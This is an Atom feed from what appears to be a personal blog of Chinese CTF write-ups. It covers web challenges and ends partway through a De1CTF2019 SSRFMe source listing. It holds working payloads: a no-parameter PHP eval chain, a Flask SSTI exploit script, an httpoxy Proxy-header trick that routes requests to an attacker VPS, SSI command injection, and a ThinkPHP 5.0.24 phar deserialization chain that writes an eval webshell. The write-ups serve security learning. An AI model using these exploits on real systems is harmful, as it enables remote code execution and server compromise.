<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>雾雨散花</title>
  
  
  <link href="https://wuyusanhua2021.github.io/atom.xml" rel="self"/>
  
  <link href="https://wuyusanhua2021.github.io/"/>
  <updated>2022-01-15T04:06:30.326Z</updated>
  <id>https://wuyusanhua2021.github.io/</id>
  
  <author>
    <name>wuyusanhua</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>长安战疫Web部分</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</id>
    <published>2022-01-12T11:54:37.000Z</published>
    <updated>2022-01-15T04:06:30.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>php无参数rce，过滤了一些常用的函数，想办法绕过即可</p><p>payload:<code>code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&amp;a=system(&#39;cat flag.php&#39;);</code></p><p><a href="https://www.freebuf.com/articles/network/242482.html">无参数读文件和RCE总结</a></p><h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112133745936.png" alt="image-20220112133745936"></p><p>提示转去<code>/admin</code>路由，转到<code>/admin?static.js?</code>，成功登录，根据提示是用name来ssti</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112135750755.png" alt="image-20220112135750755"></p><p>双下划线<code>__</code>被过滤，参考大佬的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://0932a3a1.lxctf.net&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;name1&#x27;</span>:<span class="string">&#x27;__class__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name2&#x27;</span>: <span class="string">&#x27;__base__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name3&#x27;</span>: <span class="string">&#x27;__subclasses__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name4&#x27;</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name5&#x27;</span>: <span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name6&#x27;</span>: <span class="string">&#x27;__globals__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name7&#x27;</span>: <span class="string">&#x27;__builtins__&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name8&#x27;</span>: <span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name9&#x27;</span>: <span class="string">&#x27;/flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name10&#x27;</span>: <span class="string">&#x27;read&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">payload=<span class="string">&#x27;/admin?name=&#123;&#123;()|attr(request.headers.name1)|attr(request.headers.name2)|attr(request.headers.name3)()|attr(request.headers.name4)(186)|attr(request.headers.name5)|attr(request.headers.name6)|attr(request.headers.name4)(request.headers.name7)|attr(request.headers.name4)(request.headers.name8)(request.headers.name9)|attr(request.headers.name10)()&#125;&#125;&amp;.js?&#x27;</span></span><br><span class="line">r=requests.get(url+payload,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="Flag配送中心"><a href="#Flag配送中心" class="headerlink" title="Flag配送中心"></a>Flag配送中心</h1><p>查看网页源码可得提示php版本与通信接口协议fastcgi</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112144138763.png" alt="image-20220112144138763"></p><p>考察的是漏洞<code>cve-2016-5385</code>，在vps上开启端口监听，抓包，在文件头添加<code>Proxy: http://vps:port</code>，发送request报文后即可在vps监听到flag</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152203716.png" alt="image-20220112152203716"></p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220112152217213.png" alt="image-20220112152217213"></p><h1 id="Shiro-未完成"><a href="#Shiro-未完成" class="headerlink" title="Shiro?(未完成)"></a>Shiro?(未完成)</h1><h1 id="Baby-Upload"><a href="#Baby-Upload" class="headerlink" title="Baby_Upload"></a>Baby_Upload</h1><p>.htaccess,ini,php等均被过滤，未过滤shtml文件，可以进行ssi注入</p><p>上传<code>&lt;!--#exec cmd=&quot;dir /&quot; --&gt;</code>，得到flag文件名称</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113134447628.png" alt="image-20220113134447628"></p><p>再上传<code>&lt;!--#exec cmd=&quot;cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg&quot; --&gt;</code>,得到flag</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220113135151088.png" alt="image-20220113135151088"></p><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSI注入漏洞总结</a></p><h1 id="tp-未完成"><a href="#tp-未完成" class="headerlink" title="tp(未完成)"></a>tp(未完成)</h1><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114131205627.png"></p><p>访问<code>public/index.php/index/index/upload</code>，得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$FILES</span>= <span class="variable">$_FILES</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="variable">$_GET</span>,<span class="variable">$_POST</span>) <span class="keyword">as</span> <span class="variable">$_request</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) &#123;</span><br><span class="line">                $&#123;<span class="variable">$_k</span>&#125; = <span class="keyword">$this</span>-&gt;func(<span class="variable">$_v</span>);</span><br><span class="line">                <span class="comment">//$_request[$_k] =  $&#123;$_k&#125;;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$filename</span> = @<span class="variable">$FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;name&quot;</span>].<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">        move_uploaded_file(<span class="variable">$file</span>,<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;noPHP&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">&amp;<span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array(<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$var</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)&#123;</span><br><span class="line">                <span class="variable">$var</span>[<span class="variable">$_k</span>] = <span class="keyword">$this</span>-&gt;func(<span class="variable">$_v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$var</span> = addslashes(<span class="variable">$var</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>存在变量覆盖，且可以通过unlink触发phar协议</p><p>又有tp版本为5.0.24</p><p><img src="/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/image-20220114140232863.png" alt="image-20220114140232863"></p><p>找tp5.0.24反序列化的poc，修改一下在本地生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$files</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="variable">$files</span>]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$output</span>; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);    </span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::__construct(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$query指向Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $value值，作为call函数引用的第二变量</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="variable">$model</span>; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Output</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle =<span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>=<span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Memcached</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>(<span class="title">new</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\Output(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\Query(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\HasOne(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot(<span class="variable">$Output</span>,<span class="variable">$HasOne</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$window</span>);        </span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);        </span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RCE-No-Para&quot;&gt;&lt;a href=&quot;#RCE-No-Para&quot; class=&quot;headerlink&quot; title=&quot;RCE_No_Para&quot;&gt;&lt;/a&gt;RCE_No_Para&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>De1CTF2019-SSRFMe</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/10/De1CTF2019-SSRFMe/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/10/De1CTF2019-SSRFMe/</id>
    <published>2022-01-10T06:41:03.000Z</published>
    <updated>2022-01-10T15:08:01.800Z</updated>
    
    <content type="html"><![CDATA[<p> 题目直接给出源码，是flask框架，进行审计，代码注释如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span 